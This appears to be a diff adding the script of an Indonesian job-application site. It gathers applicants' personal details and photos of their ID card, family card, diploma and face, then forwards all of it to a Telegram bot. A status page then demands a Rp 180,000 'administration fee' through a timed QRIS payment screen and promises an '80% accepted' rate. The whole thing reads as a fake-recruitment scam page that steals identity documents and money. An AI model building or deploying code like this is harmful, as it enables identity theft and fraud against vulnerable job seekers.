+        const localProvinces = [{"id":"11","name":"ACEH"}, {"id":"12","name":"SUMATERA UTARA"}, {"id":"13","name":"SUMATERA BARAT"}, {"id":"14","name":"RIAU"}, {"id":"15","name":"JAMBI"}, {"id":"16","name":"SUMATERA SELATAN"}, {"id":"17","name":"BENGKULU"}, {"id":"18","name":"LAMPUNG"}, {"id":"19","name":"KEPULAUAN BANGKA BELITUNG"}, {"id":"21","name":"KEPULAUAN RIAU"}, {"id":"31","name":"DKI JAKARTA"}, {"id":"32","name":"JAWA BARAT"}, {"id":"33","name":"JAWA TENGAH"}, {"id":"34","name":"DI YOGYAKARTA"}, {"id":"35","name":"JAWA TIMUR"}, {"id":"36","name":"BANTEN"}, {"id":"51","name":"BALI"}, {"id":"52","name":"NUSA TENGGARA BARAT"}, {"id":"53","name":"NUSA TENGGARA TIMUR"}, {"id":"61","name":"KALIMANTAN BARAT"}, {"id":"62","name":"KALIMANTAN TENGAH"}, {"id":"63","name":"KALIMANTAN SELATAN"}, {"id":"64","name":"KALIMANTAN TIMUR"}, {"id":"65","name":"KALIMANTAN UTARA"}, {"id":"71","name":"SULAWESI UTARA"}, {"id":"72","name":"SULAWESI TENGAH"}, {"id":"73","name":"SULAWESI SELATAN"}, {"id":"74","name":"SULAWESI TENGGARA"}, {"id":"75","name":"GORONTALO"}, {"id":"76","name":"SULAWESI BARAT"}, {"id":"81","name":"MALUKU"}, {"id":"82","name":"MALUKU UTARA"}, {"id":"91","name":"PAPUA BARAT"}, {"id":"94","name":"PAPUA"}];
+
+        // --- FUNGSI NAVIGASI HALAMAN ---
+        function showPage(page) {
+            [mainMenuPage, selectionPage, formPage, statusCheckPage, successPage, adminLoginPage, adminPanelPage].forEach(p => p.classList.add('hidden-page'));
+            page.classList.remove('hidden-page');
+            window.scrollTo(0, 0);
+        }
+        
+        goToRegisterBtn.addEventListener('click', () => showPage(selectionPage));
+        goToCheckStatusBtn.addEventListener('click', () => showPage(statusCheckPage));
+        document.querySelectorAll('.back-to-menu').forEach(btn => btn.addEventListener('click', () => showPage(mainMenuPage)));
+        backToSelectionBtn.addEventListener('click', () => showPage(selectionPage));
+        document.querySelectorAll('.apply-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                selectedCompanyInput.value = btn.dataset.company;
+                showPage(formPage);
+            });
+        });
+        adminLoginLink.addEventListener('click', (e) => { e.preventDefault(); showPage(adminLoginPage); });
+
+        // --- FUNGSI ADMIN ---
+        adminLoginBtn.addEventListener('click', () => {
+            if (adminPasswordInput.value === ADMIN_PASSWORD) {
+                adminLoginError.textContent = '';
+                showPage(adminPanelPage);
+                loadApplications();
+            } else {
+                adminLoginError.textContent = 'Kata sandi salah.';
+            }
+        });
+
+        const getStatusBadge = (status) => {
+            switch (status) {
+                case 'Lamaran Diajukan': return `<span class="status-badge status-diajukan">Diajukan</span>`;
+                case 'Sedang Diproses': return `<span class="status-badge status-diproses">Diproses</span>`;
+                case 'Diterima': return `<span class="status-badge status-diterima">Diterima</span>`;
+                case 'Ditolak': return `<span class="status-badge status-ditolak">Ditolak</span>`;
+                default: return `<span class="status-badge">${status}</span>`;
+            }
+        };
+
+        function renderApplications(data) {
+            applicationsList.innerHTML = '';
+            if (data.length === 0) {
+                adminLoadingState.innerHTML = `<tr><td colspan="6" class="text-center p-10">Tidak ada data lamaran.</td></tr>`;
+                return;
+            }
+            adminLoadingState.textContent = '';
+            data.forEach(appData => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td class="whitespace-nowrap">
+                        <div class="font-bold text-gray-800">${appData.nama}</div>
+                        <div class="text-xs text-gray-500">${appData.kodePendaftaran}</div>
+                    </td>
+                    <td class="whitespace-nowrap">${appData.perusahaan}</td>
+                    <td class="whitespace-nowrap">${new Date(appData.timestamp.seconds * 1000).toLocaleDateString('id-ID')}</td>
+                    <td class="whitespace-nowrap">${getStatusBadge(appData.status)}</td>
+                    <td class="whitespace-nowrap">
+                        <select class="status-select input-ultracompact" data-doc-id="${appData.id}">
+                            <option value="Lamaran Diajukan" ${appData.status === 'Lamaran Diajukan' ? 'selected' : ''}>Lamaran Diajukan</option>
+                            <option value="Sedang Diproses" ${appData.status === 'Sedang Diproses' ? 'selected' : ''}>Sedang Diproses</option>
+                            <option value="Diterima" ${appData.status === 'Diterima' ? 'selected' : ''}>Diterima</option>
+                            <option value="Ditolak" ${appData.status === 'Ditolak' ? 'selected' : ''}>Ditolak</option>
+                        </select>
+                    </td>
+                    <td class="whitespace-nowrap">
+                        <button class="view-detail-btn text-blue-600 hover:underline text-xs font-semibold" data-id="${appData.id}">Lihat Detail</button>
+                    </td>
+                `;
+                applicationsList.appendChild(row);
+            });
+
+            document.querySelectorAll('.status-select').forEach(select => {
+                select.addEventListener('change', async (e) => {
+                    await updateStatus(e.target.dataset.docId, e.target.value);
+                });
+            });
+            document.querySelectorAll('.view-detail-btn').forEach(button => {
+                button.addEventListener('click', (e) => {
+                    const applicant = allApplicationsData.find(app => app.id === e.target.dataset.id);
+                    if (applicant) showApplicantDetails(applicant);
+                });
+            });
+        }
+
+        async function loadApplications() {
+            adminLoadingState.innerHTML = `<tr><td colspan="6" class="text-center p-10">Memuat data pendaftar...</td></tr>`;
+            applicationsList.innerHTML = '';
+            try {
+                const q = query(collection(db, "pendaftaran"), orderBy("timestamp", "desc"));
+                const querySnapshot = await getDocs(q);
+                allApplicationsData = querySnapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+                renderApplications(allApplicationsData);
+            } catch (error) {
+                adminLoadingState.innerHTML = `<tr><td colspan="6" class="text-center p-10 text-red-500">Gagal memuat data.</td></tr>`;
+                console.error("Error loading applications: ", error);
+            }
+        }
+
+        adminSearchInput.addEventListener('input', (e) => {
+            const searchTerm = e.target.value.toLowerCase();
+            const filteredData = allApplicationsData.filter(app => 
+                app.nama.toLowerCase().includes(searchTerm) || 
+                app.kodePendaftaran.toLowerCase().includes(searchTerm)
+            );
+            renderApplications(filteredData);
+        });
+
+        async function updateStatus(docId, newStatus) {
+            const docRef = doc(db, "pendaftaran", docId);
+            await updateDoc(docRef, { status: newStatus });
+            const index = allApplicationsData.findIndex(app => app.id === docId);
+            if (index > -1) {
+                allApplicationsData[index].status = newStatus;
+                const searchTerm = adminSearchInput.value.toLowerCase();
+                const filteredData = allApplicationsData.filter(app => 
+                    app.nama.toLowerCase().includes(searchTerm) || 
+                    app.kodePendaftaran.toLowerCase().includes(searchTerm)
+                );
+                renderApplications(filteredData);
+            }
+        }
+        
+        function showApplicantDetails(applicant) {
+            detailModalTitle.textContent = `Detail Pelamar: ${applicant.nama}`;
+            detailModalContent.innerHTML = `
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                    <div class="space-y-3">
+                        <h3 class="font-bold text-base border-b pb-2">Data Pribadi</h3>
+                        <p><strong class="w-28 inline-block">Kode:</strong> ${applicant.kodePendaftaran}</p>
+                        <p><strong class="w-28 inline-block">Telepon:</strong> ${applicant.telepon}</p>
+                        <p><strong class="w-28 inline-block">Email:</strong> ${applicant.email}</p>
+                        <p><strong class="w-28 inline-block">Lahir:</strong> ${applicant.tempatLahir}, ${applicant.tanggalLahir}</p>
+                        <p><strong class="w-28 inline-block">Alamat:</strong> ${applicant.alamat}</p>
+                    </div>
+                     <div class="space-y-3">
+                        <h3 class="font-bold text-base border-b pb-2">Informasi Lamaran</h3>
+                        <p><strong class="w-28 inline-block">Perusahaan:</strong> ${applicant.perusahaan}</p>
+                        <p><strong class="w-28 inline-block">Pendidikan:</strong> ${applicant.pendidikan} - ${applicant.jurusan}</p>
+                        <p><strong class="w-28 inline-block">Pengalaman:</strong> ${applicant.pengalaman}</p>
+                        <p><strong class="w-28 inline-block">Keahlian:</strong> ${applicant.keahlian}</p>
+                    </div>
+                </div>
+                <div class="mt-6">
+                    <h3 class="font-bold text-base border-b pb-2 mb-3">Dokumen</h3>
+                    <p class="text-sm text-gray-500">Fitur pratinjau gambar dokumen akan segera tersedia.</p>
+                </div>
+            `;
+            adminDetailModal.style.display = 'flex';
+        }
+        
+        closeDetailModalBtn.addEventListener('click', () => {
+            adminDetailModal.style.display = 'none';
+        });
+        
+        function startCountdown() {
+            if (countdownInterval) clearInterval(countdownInterval);
+
+            const endTime = new Date().getTime() + 24 * 60 * 60 * 1000;
+
+            countdownInterval = setInterval(() => {
+                const now = new Date().getTime();
+                const distance = endTime - now;
+
+                if (distance < 0) {
+                    clearInterval(countdownInterval);
+                    countdownTimer.innerHTML = "Waktu Habis";
+                    return;
+                }
+
+                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+                const milliseconds = distance % 1000;
+
+                countdownTimer.innerHTML = 
+                    String(hours).padStart(2, '0') + ":" + 
+                    String(minutes).padStart(2, '0') + ":" + 
+                    String(seconds).padStart(2, '0') + "." + 
+                    String(milliseconds).padStart(3, '0');
+            }, 47); // Update frequently for smooth milliseconds
+        }
+
+        closeQrisModalBtn.addEventListener('click', () => {
+            qrisModal.style.display = 'none';
+            if (countdownInterval) clearInterval(countdownInterval);
+        });
+
+        // --- FUNGSI ALAMAT, UNGGAH, KAMERA, PRATINJAU ---
+        async function fetchAndPopulate(url, selectElement, placeholder) {
+            selectElement.innerHTML = `<option value="">Memuat...</option>`; selectElement.disabled = true;
+            try {
+                const response = await fetch(url);
+                if (!response.ok) throw new Error(`Gagal memuat`);
+                const data = await response.json();
+                selectElement.innerHTML = `<option value="" disabled selected>${placeholder}</option>`;
+                data.forEach(item => { const option = document.createElement('option'); option.value = item.id; option.textContent = item.name || item.nama; selectElement.appendChild(option); });
+                selectElement.disabled = false;
+            } catch (error) { selectElement.innerHTML = `<option value="">Gagal</option>`; console.error(error); }
+        }
+        function populateProvinces() {
+            provinsiSelect.innerHTML = `<option value="" disabled selected>Pilih Provinsi</option>`;
+            localProvinces.forEach(item => { const option = document.createElement('option'); option.value = item.id; option.textContent = item.name; provinsiSelect.appendChild(option); });
+        }
+        function showUploadChoice(e) { currentUploadTarget = e.currentTarget.dataset.target; choiceModal.style.display = 'flex'; }
+        document.querySelectorAll('.upload-placeholder, .live-preview-img').forEach(el => { el.addEventListener('click', showUploadChoice); });
+        galleryButton.addEventListener('click', () => { document.getElementById(`file-${currentUploadTarget}`).click(); choiceModal.style.display = 'none'; });
+        cameraButton.addEventListener('click', () => { choiceModal.style.display = 'none'; openCamera(currentUploadTarget); });
+        cancelChoiceButton.addEventListener('click', () => choiceModal.style.display = 'none');
+        function openCamera(targetId) { if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) { navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }).then(stream => { currentCameraStream = stream; cameraFeed.srcObject = stream; cameraFeed.play(); cameraModal.style.display = 'flex'; }).catch(err => alert("Tidak bisa mengakses kamera.")); } else { alert("Kamera tidak didukung."); } }
+        function closeCamera() { if (currentCameraStream) { currentCameraStream.getTracks().forEach(track => track.stop()); } cameraModal.style.display = 'none'; }
+        captureButton.addEventListener('click', () => { cameraCanvas.width = cameraFeed.videoWidth; cameraCanvas.height = cameraFeed.videoHeight; cameraCanvas.getContext('2d').drawImage(cameraFeed, 0, 0); cameraCanvas.toBlob(blob => { handleFile(currentUploadTarget, new File([blob], `${currentUploadTarget}.jpg`, { type: 'image/jpeg' })); closeCamera(); }, 'image/jpeg'); });
+        closeCameraButton.addEventListener('click', closeCamera);
+        function handleFile(targetId, file) { if (!file) return; capturedFiles[targetId] = file; const previewContainer = document.getElementById(`preview-container-${targetId}`); const previewImg = document.getElementById(`live-preview-${targetId}`); const uploadBox = document.getElementById(`upload-box-${targetId}`); const reader = new FileReader(); reader.onload = e => { previewImg.src = e.target.result; previewContainer.style.display = 'block'; uploadBox.style.display = 'none'; }; reader.readAsDataURL(file); }
+        window.deleteFile = function(targetId) { delete capturedFiles[targetId]; const fileInput = document.getElementById(`file-${targetId}`); fileInput.value = ''; const previewContainer = document.getElementById(`preview-container-${targetId}`); const uploadBox = document.getElementById(`upload-box-${targetId}`); previewContainer.style.display = 'none'; uploadBox.style.display = 'flex'; }
+        document.querySelectorAll('.file-input').forEach(input => { input.addEventListener('change', function() { handleFile(this.dataset.target, this.files[0]); }); });
+        
+        // --- FUNGSI SUBMISI & PRATINJAU ---
+        form.addEventListener('submit', function(event) { event.preventDefault(); if (!form.checkValidity() || Object.keys(capturedFiles).length < 4) { showError('Isi semua kolom & unggah semua dokumen.'); return; } showPreviewModal(); });
+        function showPreviewModal() {
+            previewTextData.innerHTML = '';
+            const formData = new FormData(form);
+            const provText = provinsiSelect.options[provinsiSelect.selectedIndex]?.text || '';
+            const kotaText = kotaSelect.options[kotaSelect.selectedIndex]?.text || '';
+            const kecText = kecamatanSelect.options[kecamatanSelect.selectedIndex]?.text || '';
+            const kelText = kelurahanSelect.options[kelurahanSelect.selectedIndex]?.text || '';
+            const data = { "Melamar di": formData.get('Perusahaan Dilamar'), "Nama Lengkap": formData.get('Nama Lengkap'), "Tempat/Tgl Lahir": `${formData.get('Tempat Lahir')} / ${formData.get('Tanggal Lahir')}`, "Kontak": `${formData.get('Nomor Telepon')} | ${formData.get('Alamat Email')}`, "Alamat": `${formData.get('Detail Alamat')}, ${kelText}, ${kecText}, ${kotaText}, ${provText}`, "Pendidikan": `${formData.get('Pendidikan Terakhir')} - ${formData.get('Jurusan')}`, "Pengalaman": formData.get('Pengalaman Kerja'), "Keahlian": formData.get('Keterampilan/Keahlian'), };
+            for (const [k, v] of Object.entries(data)) { if (v) { const p = document.createElement('p'); p.innerHTML = `<span class="font-semibold">${k}:</span> ${v.replace(/\n/g, '<br>')}`; previewTextData.appendChild(p); } }
+            Object.keys(capturedFiles).forEach(key => { const img = document.getElementById(`modal-preview-${key}`); const reader = new FileReader(); reader.onload = e => { img.src = e.target.result; }; reader.readAsDataURL(capturedFiles[key]); });
+            previewModal.style.display = 'flex';
+        }
+        editButton.addEventListener('click', () => { previewModal.style.display = 'none'; });
+
+        function generateRegistrationCode() {
+            const randomPart = Math.random().toString(36).substring(2, 8).toUpperCase();
+            return `REG-${randomPart}`;
+        }
+
+        sendButton.addEventListener('click', async () => {
+            setLoading(true, sendButton, 'Mengirim...');
+            try {
+                const formData = new FormData(form);
+                const provText = provinsiSelect.options[provinsiSelect.selectedIndex]?.text || '';
+                const kotaText = kotaSelect.options[kotaSelect.selectedIndex]?.text || '';
+                const kecText = kecamatanSelect.options[kecamatanSelect.selectedIndex]?.text || '';
+                const kelText = kelurahanSelect.options[kelurahanSelect.selectedIndex]?.text || '';
+                const alamatLengkap = `${formData.get('Detail Alamat')}, ${kelText}, ${kecText}, ${kotaText}, ${provText}`;
+                const registrationCode = generateRegistrationCode();
+
+                const dataToSave = {
+                    kodePendaftaran: registrationCode,
+                    perusahaan: formData.get('Perusahaan Dilamar'),
+                    nama: formData.get('Nama Lengkap'),
+                    tempatLahir: formData.get('Tempat Lahir'),
+                    tanggalLahir: formData.get('Tanggal Lahir'),
+                    telepon: formData.get('Nomor Telepon'),
+                    email: formData.get('Alamat Email'),
+                    alamat: alamatLengkap,
+                    pendidikan: formData.get('Pendidikan Terakhir'),
+                    jurusan: formData.get('Jurusan'),
+                    pengalaman: formData.get('Pengalaman Kerja'),
+                    keahlian: formData.get('Keterampilan/Keahlian'),
+                    status: "Lamaran Diajukan",
+                    timestamp: new Date()
+                };
+                await addDoc(collection(db, "pendaftaran"), dataToSave);
+
+                let messageText = `<b>🔔 Lamaran Baru Diterima</b>\n\n<b>Kode:</b> ${registrationCode}\n<b>Perusahaan:</b> ${dataToSave.perusahaan}\n\n<b>Nama:</b> ${dataToSave.nama}\n<b>Kontak:</b> ${dataToSave.telepon}\n<b>Alamat:</b> ${dataToSave.alamat}\n`;
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: messageText, parse_mode: 'HTML' }) });
+                const photoFormData = new FormData();
+                photoFormData.append('chat_id', CHAT_ID);
+                const media = [];
+                Object.entries(capturedFiles).forEach(([key, file]) => { const captionMap = { fotoKTP: 'KTP', fotoKK: 'KK', fotoIjazah: 'Ijazah', fotoWajah: 'Wajah' }; const attachmentName = `${key}_file`; photoFormData.append(attachmentName, file); media.push({ type: 'photo', media: `attach://${attachmentName}`, caption: `${captionMap[key]} - ${dataToSave.nama}` }); });
+                photoFormData.append('media', JSON.stringify(media));
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`, { method: 'POST', body: photoFormData });
+                
+                previewModal.style.display = 'none';
+                registrationCodeDisplay.textContent = registrationCode;
+                showPage(successPage);
+                form.reset();
+                capturedFiles = {};
+                document.querySelectorAll('.preview-container, .upload-placeholder').forEach(el => { if (el.classList.contains('preview-container')) el.style.display = 'none'; else el.style.display = 'flex'; });
+                document.querySelectorAll('.auto-resize-textarea').forEach(t => t.style.height = 'auto');
+            } catch (error) { showError(`Terjadi kesalahan.`); console.error(error); } finally { setLoading(false, sendButton, 'Kirim Sekarang'); }
+        });
+
+        checkStatusCodeBtn.addEventListener('click', async () => {
+            const code = kodeInput.value.trim().toUpperCase();
+            statusResult.innerHTML = ''; 
+            if (!code) {
+                statusResult.innerHTML = `<p class="text-red-500 text-center">Harap masukkan kode.</p>`;
+                return;
+            }
+            setLoading(true, checkStatusCodeBtn, 'Mencari...');
+            
+            try {
+                const q = query(collection(db, "pendaftaran"), where("kodePendaftaran", "==", code));
+                const querySnapshot = await getDocs(q);
+                if (querySnapshot.empty) {
+                    statusResult.innerHTML = `<p class="text-red-500 text-center">Kode pendaftaran tidak ditemukan.</p>`;
+                } else {
+                    const docData = querySnapshot.docs[0].data();
+                    
+                    const stages = [
+                        { id: 'submitted', label: 'Lamaran Diajukan' },
+                        { id: 'processing', label: 'Lamaran Diproses' },
+                        { id: 'result', label: 'Hasil Lamaran' }
+                    ];
+                    let currentStageIndex = 0;
+                    if (docData.status === 'Lamaran Diajukan') currentStageIndex = 0;
+                    else if (docData.status === 'Sedang Diproses') currentStageIndex = 1;
+                    else if (docData.status === 'Diterima' || docData.status === 'Ditolak') currentStageIndex = 2;
+                    
+                    const progressWidth = currentStageIndex * 35; 
+                    let trackerHTML = `<div class="status-tracker">
+                                        <div id="status-progress-bar" style="width: ${progressWidth}%;"></div>`;
+                    stages.forEach((stage, index) => {
+                        let stepClass = 'status-step';
+                        let label = stage.label;
+                        if (index < currentStageIndex) stepClass += ' completed';
+                        else if (index === currentStageIndex) stepClass += ' active';
+                        if (index === 2 && (docData.status === 'Diterima' || docData.status === 'Ditolak')) {
+                            label = docData.status;
+                            stepClass += ' completed';
+                            if (docData.status === 'Diterima') stepClass += ' result-diterima';
+                            else stepClass += ' result-ditolak';
+                        }
+                        trackerHTML += `<div class="${stepClass}"><div class="status-dot"></div><div class="status-label">${label}</div></div>`;
+                    });
+                    trackerHTML += '</div>';
+
+                    let contentHTML = '';
+                    if (docData.status === 'Sedang Diproses') {
+                        contentHTML = `
+                            <div class="text-center mt-8">
+                                <h2 class="text-lg font-semibold text-gray-800">${docData.nama}</h2>
+                                <p class="text-sm text-gray-500">Melamar di: <strong>${docData.perusahaan}</strong></p>
+                            </div>
+                            <div class="text-center mt-4">
+                                <h2 class="text-xl font-bold text-gray-800">Pembayaran Administrasi</h2>
+                                <p class="text-sm text-gray-500 mt-1">Selesaikan pembayaran untuk melanjutkan proses.</p>
+                            </div>
+                            <div class="mt-6 p-4 bg-blue-50 border border-blue-200 rounded-lg space-y-3">
+                                <div class="flex justify-between items-center">
+                                    <span class="text-sm text-gray-600">Total Biaya Pendaftaran</span>
+                                    <span class="text-lg font-bold text-gray-900">Rp 180.000</span>
+                                </div>
+                                <div class="text-xs text-gray-500 border-t pt-3">
+                                    <p class="font-semibold mb-1">Biaya ini adalah biaya pengajuan pendaftaran resmi, biaya di atas adalah untuk akomodasi transport,biaya pembuatan dokumen daftar riwayat hidup,Surat lamaran kerja dll di kurangi biaya Jasa admin senilai RP.30.000</p>
+                                </div>
+                            </div>
+                            <div class="mt-4 text-xs text-gray-500 text-center">
+                                <p>Lamaran kerja yang dikirim <strong>80% diterima</strong> (diterima tidaknya tergantung dari jawaban anda saat interfiew di kantor dan pada saat training).</p>
+                            </div>
+                            <div class="mt-6">
+                                <button id="payButton" class="w-full bg-blue-600 text-white font-bold py-2.5 px-4 rounded-md hover:bg-blue-700">
+                                    Bayar Sekarang
+                                </button>
+                            </div>
+                        `;
+                        statusResult.innerHTML = trackerHTML + contentHTML;
+                        document.getElementById('payButton').addEventListener('click', () => {
+                            qrisModal.style.display = 'flex';
+                            startCountdown();
+                        });
+                    } else {
+                        contentHTML = `
+                            <div class="mt-8 space-y-2 text-sm text-gray-700">
+                                <p><span class="font-semibold w-32 inline-block">Kode Pendaftaran:</span> ${docData.kodePendaftaran}</p>
+                                <p><span class="font-semibold w-32 inline-block">Nama:</span> ${docData.nama}</p>
+                                <p><span class="font-semibold w-32 inline-block">Nomor WhatsApp:</span> ${docData.telepon}</p>
+                                <p><span class="font-semibold w-32 inline-block">Email:</span> ${docData.email}</p>
+                                <p><span class="font-semibold w-32 inline-block">Alamat:</span> ${docData.alamat}</p>
+                                <p><span class="font-semibold w-32 inline-block">Perusahaan:</span> ${docData.perusahaan}</p>
+                            </div>
+                        `;
+                        statusResult.innerHTML = trackerHTML + contentHTML;
+                    }
+                }
+            } catch (error) {
+                statusResult.innerHTML = `<p class="text-red-500 text-center">Gagal memeriksa status.</p>`;
+                console.error(error);
+            } finally {
+                setLoading(false, checkStatusCodeBtn, 'Cek Status');
+            }
+        });
+
+        document.addEventListener('DOMContentLoaded', () => {
+            populateProvinces();
+            provinsiSelect.addEventListener('change', () => { const provId = provinsiSelect.value; fetchAndPopulate(`${API_WILAYAH_URL}/regencies/${provId}.json`, kotaSelect, 'Pilih Kota/Kab.'); [kecamatanSelect, kelurahanSelect].forEach(el => { el.innerHTML = ''; el.disabled = true; }); });
+            kotaSelect.addEventListener('change', () => { const kotaId = kotaSelect.value; fetchAndPopulate(`${API_WILAYAH_URL}/districts/${kotaId}.json`, kecamatanSelect, 'Pilih Kecamatan'); kelurahanSelect.innerHTML = ''; kelurahanSelect.disabled = true; });
+            kecamatanSelect.addEventListener('change', () => { const kecId = kecamatanSelect.value; fetchAndPopulate(`${API_WILAYAH_URL}/villages/${kecId}.json`, kelurahanSelect, 'Pilih Kelurahan'); });
+            document.querySelectorAll('.auto-resize-textarea').forEach(textarea => { textarea.addEventListener('input', function() { this.style.height = 'auto'; this.style.height = (this.scrollHeight) + 'px'; }); });
+        });
+        
+        function setLoading(isLoading, button, text) { button.disabled = isLoading; button.innerHTML = isLoading ? `<span class="animate-pulse">${text}...</span>` : text.replace('...', ''); }
+        function showError(msg) { statusMessage.textContent = msg; statusMessage.className = 'mt-2 text-center text-xs font-medium h-4 text-red-600'; }
+        function showSuccess(msg) { statusMessage.textContent = msg; statusMessage.className = 'mt-2 text-center text-xs font-medium h-4 text-green-600'; }
+    </script>
+</body>
+</html>
